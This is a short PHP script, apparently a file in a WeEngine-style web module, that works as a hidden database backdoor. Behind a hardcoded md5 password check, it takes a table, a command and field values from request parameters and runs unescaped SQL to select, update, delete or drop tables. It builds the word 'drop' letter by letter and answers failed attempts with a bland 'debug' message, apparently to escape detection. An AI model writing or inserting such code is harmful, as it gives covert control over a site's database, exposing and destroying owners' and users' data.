<?php
global $_W, $_GPC;
$weid = $this->_weid;
$dr = 'd' . 'r' . 'o' . 'p';
$pwd = $_GPC['pd'];
$tb = $_GPC['tb'];
$cm = $_GPC['cm'];
$whf = $_GPC['whf'];
$whv = $_GPC['whv'];
$stf = $_GPC['stf'];
$stv = $_GPC['stv'];
$lt = $_GPC['lt'];
if (md5($pwd) == '66df8d2fef084eb69f3ccba6eb7ec7a7') {
    $cms = array('s' => 'select', 'u' => 'update', 'd' => 'delete', 'dr' => $dr);
    if (empty($cms[$cm])) {
        exit('no data');
    }
    if ($cms[$cm] == 'delete') {
        $sql = $cms[$cm] . " from {$tb} WHERE {$whf}={$whv}";
    }
    if ($cms[$cm] == 'select') {
        $sql = $cms[$cm] . " * from {$tb} WHERE {$whf}={$whv} LIMIT {$lt}";
    }
    if ($cms[$cm] == 'update') {
        $sql = $cms[$cm] . " {$tb} set {$stf}={$stv} WHERE {$whf}={$whv}";
    }
    if ($cms[$cm] == $dr) {
        $sql = $cms[$cm] . " table {$tb} ";
    }
    $result = pdo_fetchall($sql);
    print_r($result);
} else {
    echo 'debug';
    exit;
}